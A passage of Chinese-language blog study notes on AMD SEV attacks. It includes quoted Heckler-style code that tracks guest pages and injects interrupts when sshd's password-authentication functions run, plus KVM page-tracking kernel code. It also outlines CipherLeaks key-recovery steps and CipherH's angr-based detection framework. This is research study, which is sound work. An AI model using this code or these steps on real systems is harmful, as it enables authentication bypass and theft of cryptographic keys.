errors &gt; <span class="number">300</span>:</span><br><span class="line">                        <span class="built_in">print</span>(ev)</span><br><span class="line">                        <span class="built_in">print</span>(errors)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        h.heckler_ack_event()</span><br><span class="line">                        acked = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                gpa = <span class="built_in">int</span>(ev.get(<span class="string">&#x27;gpa&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                track_again = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> lastlast_gpa != <span class="number">0</span> <span class="keyword">and</span> last_gpa != <span class="number">0</span> <span class="keyword">and</span> gpa != <span class="number">0</span>:</span><br><span class="line">                    key = (lastlast_gpa, last_gpa, gpa)</span><br><span class="line">                    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> history:</span><br><span class="line">                        history[key] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                    history[key] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> history[key] &gt; <span class="number">3</span>:</span><br><span class="line">                        track_again = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;sequence \[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> gadgets <span class="keyword">in</span> gadget_pairs:</span><br><span class="line">                    mm_answer_authpassword = gadgets[<span class="number">0</span>]</span><br><span class="line">                    auth_password = gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># sequence of interest:</span></span><br><span class="line">                    <span class="comment"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class="line">                    <span class="keyword">if</span> gpa == mm_answer_authpassword \</span><br><span class="line">                            <span class="keyword">and</span> last_gpa == auth_password \</span><br><span class="line">                            <span class="keyword">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class="line">                              <span class="string">f&quot;\[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line">                        h.heckler_inject(<span class="number">0x80</span>)</span><br><span class="line">                        <span class="keyword">if</span> quit_after_one_inject:</span><br><span class="line">                            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> last_gpa != gpa <span class="keyword">and</span> last_gpa != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> track_again:</span><br><span class="line">                        h.heckler_track_page(last_gpa)</span><br><span class="line"></span><br><span class="line">                lastlast_gpa = last_gpa</span><br><span class="line">                last_gpa = gpa</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">                acked = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> acked:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line">        h.heckler_clean_up()</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>这里为什么又是三个连续的了？每次循环的GPA是否pc是连续的？ single step还是根据条件</p>
<h3 id="track-page"><a href="#track-page" class="headerlink" title="track page"></a>track page</h3><p>user</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">track_page</span><span class="params">(<span class="type">usp_poll_api_ctx_t</span>* ctx, <span class="type">uint64_t</span> gpa, <span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">track_page_param_t</span> tp = &#123;</span><br><span class="line">		.gpa = gpa,</span><br><span class="line">		.track_mode = mode,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(ctx-&gt;kvm_fd, KVM_TRACK_PAGE, &amp;tp) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;track_page: Error calling KVM_TRACK_PAGE ioctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> SEV_STEP_ERR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> SEV_STEP_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvm:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __ioctl_track_page(<span class="keyword">struct</span> file *f, <span class="type">void</span> *a) &#123;</span><br><span class="line">    <span class="type">track_page_param_t</span> p;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_vcpu</span> *<span class="title">vcpu</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;p, (<span class="type">void</span> *)a, <span class="keyword">sizeof</span>(p))) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    pr_info(<span class="string">&quot;tracking page %llx\n&quot;</span>, p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class="line">    vcpu = xa_load(&amp;heckler_config.main_vm-&gt;vcpu_array, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    __do_track_single_page(</span><br><span class="line">        vcpu,</span><br><span class="line">        p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="doctag">XXX:</span> Add page to NX page_track tracking</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> __do_track_single_page(<span class="keyword">struct</span> kvm_vcpu *vcpu, <span class="type">gfn_t</span> gfn) &#123;</span><br><span class="line">    <span class="type">bool</span> ret;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">kvm_page_track_mode</span> <span class="title">mode</span> =</span> KVM_PAGE_TRACK_EXEC;</span><br><span class="line"></span><br><span class="line">    idx = srcu_read_lock(&amp;vcpu-&gt;kvm-&gt;srcu);</span><br><span class="line">    slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slot != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">        !kvm_slot_page_track_is_active(vcpu-&gt;kvm, slot, gfn, mode)) &#123;</span><br><span class="line">        kvm_slot_page_track_add_page(vcpu-&gt;kvm, slot, gfn, mode);</span><br><span class="line">        kvm_vcpu_exec_protect_gfn(vcpu, gfn, <span class="literal">true</span>);</span><br><span class="line">        ret = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">kvm_vcpu_exec_protect_gfn</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu, u64 gfn, <span class="type">bool</span> flush)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">	<span class="type">bool</span> protected;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class="line">	protected = kvm_mmu_slot_gfn_protect(vcpu-&gt;kvm, slot, gfn, PG_LEVEL_4K, KVM_PAGE_TRACK_EXEC);</span><br><span class="line">	<span class="keyword">if</span> (flush &amp;&amp; protected) &#123;</span><br><span class="line">		kvm_flush_remote_tlbs(vcpu-&gt;kvm);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> protected;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">kvm_mmu_slot_gfn_protect</span><span class="params">(<span class="keyword">struct</span> kvm *kvm,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> kvm_memory_slot *slot, u64 gfn,</span></span><br><span class="line"><span class="params">				    <span class="type">int</span> min_level,</span></span><br><span class="line"><span class="params">					<span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvm_rmap_head</span> *<span class="title">rmap_head</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">bool</span> protected = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kvm_memslots_have_rmaps(kvm)) &#123; </span><br><span class="line">		<span class="keyword">for</span> (i = min_level; i &lt;= KVM_MAX_HUGEPAGE_LEVEL; ++i) &#123;</span><br><span class="line">			rmap_head = gfn_to_rmap(gfn, i, slot);</span><br><span class="line">			protected |= __rmap_protect(kvm, rmap_head, <span class="literal">true</span>, mode);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN(is_tdp_mmu_enabled(kvm), <span class="string">&quot;exec protect not supported with TDP MMU&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> protected;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> __rmap_protect(<span class="keyword">struct</span> kvm *kvm,</span><br><span class="line">				 <span class="keyword">struct</span> kvm_rmap_head *rmap_head,</span><br><span class="line">				 <span class="type">bool</span> pt_protect, <span class="keyword">enum</span> kvm_page_track_mode mode)</span><br><span class="line">&#123;</span><br><span class="line">	u64 *sptep;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rmap_iterator</span> <span class="title">iter</span>;</span></span><br><span class="line">	<span class="type">bool</span> flush = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	for_each_rmap_spte(rmap_head, &amp;iter, sptep)</span><br><span class="line">		flush |= spte_protect(sptep, pt_protect, mode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> flush;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">spte_protect</span><span class="params">(u64 *sptep, <span class="type">bool</span> pt_protect,</span></span><br><span class="line"><span class="params">	<span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 spte = *sptep;</span><br><span class="line">	<span class="type">bool</span> shouldFlush = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!is_writable_pte(spte) &amp;&amp;</span><br><span class="line">	    !(pt_protect &amp;&amp; is_mmu_writable_spte(spte)))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	rmap_printk(<span class="string">&quot;spte %p %llx\n&quot;</span>, sptep, *sptep);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pt_protect)</span><br><span class="line">		spte &amp;= ~EPT_SPTE_MMU_WRITABLE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(mode == KVM_PAGE_TRACK_WRITE) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>( mode == KVM_PAGE_TRACK_RESET_ACCESSED) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_ACCESSED_MASK;</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mode == KVM_PAGE_TRACK_ACCESS) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_PRESENT_MASK;</span><br><span class="line">		spte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class="line">		spte = spte &amp; ~PT_USER_MASK;</span><br><span class="line">		spte = spte | (<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT);</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>		</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>( mode == KVM_PAGE_TRACK_EXEC) &#123;</span><br><span class="line">		spte = spte | (<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT); </span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == KVM_PAGE_TRACK_RESET_EXEC) &#123;</span><br><span class="line">		spte = spte &amp; (~(<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT));</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		printk(KERN_WARNING <span class="string">&quot;spte_protect was called with invalid mode&quot;</span></span><br><span class="line">		<span class="string">&quot;parameter %d\n&quot;</span>,mode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	shouldFlush |= mmu_spte_update(sptep, spte);</span><br><span class="line">	<span class="keyword">return</span> shouldFlush;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>track_page的核心就是把present bit给清零 这样每次都会触发page fault</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/05/04/papers/cipherH/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/04/papers/cipherH/" class="post-title-link" itemprop="url">CipherH</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-05-04 15:40:59 / Modified: 15:41:51" itemprop="dateCreated datePublished" datetime="2024-05-04T15:40:59+08:00">2024-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.1k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>22 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CipherH"><a href="#CipherH" class="headerlink" title="CipherH"></a>CipherH</h1><p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/tree/master">Sen-Deng&#x2F;CipherH at master (github.com)</a></p>
<blockquote>
<p>Recent works have illustrated the feasibility of launching ciphertext side-channel attacks against cryptographic libraries using the aforementioned threat model [33]. However, they primarily target manually identified program vulnerabilities. This work presents CIPHERH, a thorough and fully automated framework for identifying such vulnerabilities in production cryptographic libraries.  </p>
</blockquote>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p><strong>CIPHERLEAKS: Breaking Constant-time Cryptography on AMD SEV via the Ciphertext Side Channel</strong></p>
<p><strong>A Systematic Look at Ciphertext Side Channels</strong></p>
<p>VMSA page 物理地址不变  XEX</p>
<ol>
<li>建立寄存器密文&lt;-&gt;明文的映射 ：控制OVMF 的一个PEIM  触发NAE VC handler 同时观察rax明文和密文   需要可读</li>
<li>得到需要攻击的代码页地址：清空所有page 的P bit  NPF的errorcode会知道是否是代码页 再根据寄存器是否变化判断是否是目标代码页</li>
<li>以Open SSL rsa为例，bn_get_bits5的NPF可以正好从rax读到key的5bit 循环可以得到整个key</li>
</ol>
<p>缓解：</p>
<ol>
<li>减少会触发NAE导致建立映射的函数 但是治标不治本</li>
<li>函数返回值rax高位加随机数</li>
<li>用栈传递返回值或者其他寄存器</li>
<li>函数不在一个新的page开始</li>
</ol>
<p>光防VMSA没用 任意memory都可以观察</p>
<p>constant time swap可以防一些microarchitecture的side channel攻击 但是防不了比较密文</p>
<p>例如nginx  先发http请求 触发 然后清空Pbit触发NPF  然后用single-step技术</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>硬件防开销大</p>
<p>cipherH 软件框架 为了让加密库开发者写完代码以后自己检查一遍</p>
<blockquote>
<p>As will be introduced in §5, CIPHERH explores a hybrid approach by using dynamic taint analysis (which is scalable and rapid) to collect functions tainted on an execution trace. Then, it performs static symbolic execution toward each tainted function, covering paths that are not on the dynamic trace.  </p>
</blockquote>
<p><strong>设计并不是很难 主要用了两个工具  2.3k代码</strong></p>
<p>key是taint 访问的过程中 不可以有一块内存可以推断key是否变化 因为都是bit操作 或者n-bit操作 减少了熵</p>
<ul>
<li>DFSan  llvm</li>
<li>angr SSP’16 二进制文件反编译  得到更多的寄存器访存信息  <a target="_blank" rel="noopener" href="https://trevorsaudi.com/posts/symbolic_execution_angr_part1/">Symbolic Execution with Angr - part 1 · Trevor Saudi</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/ase18/ase18-paper_springer.pdf">ase18-paper_springer.pdf (usenix.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/DataFlowSanitizer.html">DataFlowSanitizer — Clang 19.0.0git documentation (llvm.org)</a></p>
<p>编译优化等级开相同  根据函数名可以方便找到对应关系</p>
<p>但还是有些信息不匹配的  所以第二阶段用保守方法处理</p>
<h3 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h3><p>DFSan需要用他的API加到代码里 然后编译</p>
<p>追踪数学运算、逻辑、内存访问 包括implicit</p>
<p>手动识别secret并调API  hook每个函数调用 内存访问</p>
<p>实际上secret就是RSA的一个私钥  传入最外层的函数之后 之后全可以通过自动分析得到 并不需要对算法库有修改</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/src/apps/wolfssl_case_study/test.c">CipherH&#x2F;src&#x2F;apps&#x2F;wolfssl_case_study&#x2F;test.c at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>这个阶段输出一系列函数   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get_digit_count:3</span><br><span class="line">mp_rand:65</span><br><span class="line">fp_invmod:1</span><br><span class="line">fp_div_2:1</span><br><span class="line">fp_exptmod:1</span><br><span class="line">_fp_exptmod_ct:33</span><br><span class="line">fp_montgomery_reduce:33</span><br><span class="line">wc_RsaUnPad_ex:67</span><br><span class="line">RsaUnPad:67</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/tainted_func.txt">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;tainted_func.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>猜测最后的结果记录了函数名和对应的taint位置 包括6个参数寄存器、返回值、从内存加载</p>
<ol>
<li>任何输入 都是taint的</li>
<li>返回值是taint</li>
<li>从memory load了taint data</li>
</ol>
<p>对密码学算法库来说不需要构造很多覆盖面广的input  很多input其实涉及到的逻辑都一样</p>
<p>不过其实筛掉大部分的function  然后留下function name和taint symbol name就可以了</p>
<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>符号执行阶段 从第一阶段拿到足够的信息以后 可以对每个function单独进行符号执行 if生成约束  然后根据taint信息生成一个表达式 求解</p>
<p>因为这边不加混淆 所以代码应该比较容易被逆向 比如$0x10(rsp) 就可以认为是同一个指针</p>
<p>syntactical equivalence   和angr现有的一样 保证效率</p>
<h4 id="intra"><a href="#intra" class="headerlink" title="intra"></a>intra</h4><p>遇到if 加约束</p>
<p>遇到call 直接用symbol  根据taint analysis的结果可以知道这里的symbol用普通的s还是taint的k</p>
<p>M 中的元组a,v 表示symbol v写到地址a</p>
<p>W中的元组a,v,i表示指令i把数据v写到地址a</p>
<ol>
<li>检查v是否包含key</li>
<li>是否存在a1&#x3D;a 且v1也包含key</li>
<li>放入Eq4看看是否可满足 (带上之前if导致的一系列条件)</li>
<li>SMT solver返回是否可满足 并给出例子 留给user后续手动分析</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/src/run.py">CipherH&#x2F;src&#x2F;run.py at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>hook了每次内存读写的操作  回调的时候有当前所有的状态 包括这句内存读写操作的AST</p>
<p>AST中包括symbol的表达式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">initial_state.inspect.b(<span class="string">&#x27;instruction&#x27;</span>, action=track_instr)</span><br><span class="line">initial_state.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, when=angr.BP_BEFORE,action=track_write_mem_before)</span><br><span class="line">initial_state.inspect.b(<span class="string">&#x27;mem_read&#x27;</span>, when=angr.BP_BEFORE, action=track_read_mem_before)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> fun_name <span class="keyword">in</span> tainted_func:</span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">128</span> == <span class="number">128</span>:</span><br><span class="line">    initial_state.regs.rdi = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">64</span> == <span class="number">64</span>:</span><br><span class="line">    initial_state.regs.rsi = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">32</span> == <span class="number">32</span>:</span><br><span class="line">    initial_state.regs.rdx = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)           </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">16</span> == <span class="number">16</span>:</span><br><span class="line"></span><br><span class="line">    initial_state.regs.rcx = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">8</span> == <span class="number">8</span>:</span><br><span class="line">    initial_state.regs.r8 = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">4</span> == <span class="number">4</span>:</span><br><span class="line">    initial_state.regs.r9 = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(state.ch.chain)//<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> l &gt;= <span class="number">1</span>:</span><br><span class="line">    l = l - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> state.ch.chain[<span class="number">4</span>*l+<span class="number">1</span>] <span class="keyword">is</span> state.inspect.mem_write_address:</span><br></pre></td></tr></table></figure>

<p>四个一组 循环找 所以chain就是论文中的W和M</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/level5uiharu/p/16932453.html">欢迎回来(。・∀・)ノ (cnblogs.com)</a></p>
<p>这里chain和expr应该都是AST key要么在arg0要么在arg1 </p>
